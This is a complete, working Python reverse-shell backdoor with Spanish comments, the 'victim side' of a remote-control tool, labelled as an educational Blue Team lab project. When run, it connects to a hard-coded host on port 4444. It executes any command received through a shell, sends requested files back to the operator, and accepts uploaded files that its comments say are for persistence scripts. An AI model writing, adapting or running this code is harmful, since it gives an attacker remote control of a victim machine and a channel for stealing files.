#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# ENFOQUE: Transferencia de archivos de texto y configuración
# =============================================================================

import socket, subprocess, sys, os, shutil

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b" \n [+]Conexion Exitosamente Establecida \n")
        self.current_dir = os.getcwd()

    def ejecutarComando(self, command):
        """
        Ejecuta comandos del sistema (dir, whoami, ipconfig, type, etc.)
        """
        try:
            command_str = command.decode('utf-8', errors='ignore').strip()
            return subprocess.check_output(
                command_str, 
                shell=True, 
                stderr=subprocess.STDOUT,
                cwd=self.current_dir
            )
        except Exception as e:
            return str(e).encode('utf-8')
    
    def cambiarDirectorio(self, path):
        """
        Cambia el directorio de trabajo actual (comando cd)
        """
        try:
            os.chdir(path)
            self.current_dir = os.getcwd()
            return f"[+] Directorio cambiado a: {self.current_dir}".encode()
        except Exception as e:
            return f"[!] Error: {str(e)}".encode()
    
    def downloadArchivo(self, path):
        """
        Descarga archivos de texto/configuración de la víctima al C2
        Formatos recomendados: .txt, .py, .json, .xml, .config, .bat, .ps1
        """
        try:
            if not os.path.isabs(path):
                path = os.path.join(self.current_dir, path)
            
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    contenido = f.read()
                self.connection.send(b"[+] Archivo enviado\n")
                self.connection.send(contenido)
                return None
            else:
                return f"[!] Error: Archivo no existe: {path}".encode()
        except Exception as e:
            return f"[!] Error: {str(e)}".encode()
    
    def uploadArchivo(self, filename, file_size):
        """
        Recibe archivos de texto/configuración del C2
        Usado para: scripts de persistencia, herramientas, configuraciones
        """
        try:
            if not os.path.isabs(filename):
                filename = os.path.join(self.current_dir, filename)
            
            bytes_received = 0
            with open(filename, 'wb') as f:
                while bytes_received < file_size:
                    chunk = self.connection.recv(4096)
                    if not chunk:
                        break
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            return f"[+] Archivo guardado: {bytes_received}/{file_size} bytes".encode()
        except Exception as e:
            return f"[!] Error: {str(e)}".encode()

    def run(self):
        """
        Loop principal del reverse shell
        Comandos disponibles: cd, download, upload, execute, salir, + comandos nativos
        """
        while True:
            command = self.connection.recv(4096)
            command_str = command.decode('utf-8', errors='ignore').strip()
            
            if command_str == "salir":
                self.connection.close()
                exit()

            elif command_str.startswith("cd "):
                path = command_str[3:].strip()
                resultado = self.cambiarDirectorio(path)
                self.connection.send(resultado)
                continue
            
            elif command_str.startswith("download "):
                path = command_str[9:].strip()
                resultado = self.downloadArchivo(path)
                if resultado:
                    self.connection.send(resultado)
                continue
            
            elif command_str.startswith("upload "):
                partes = command_str.split(" ", 2)
                if len(partes) >= 3:
                    filename = partes[1]
                    file_size = int(partes[2])
                    self.connection.send(b"ACK\n")
                    resultado = self.uploadArchivo(filename, file_size)
                    self.connection.send(resultado)
                continue
            
            resultadosComando = self.ejecutarComando(command)
            self.connection.send(resultadosComando)

puerta = Backdoor("192.168.1.33", 4444)
puerta.run()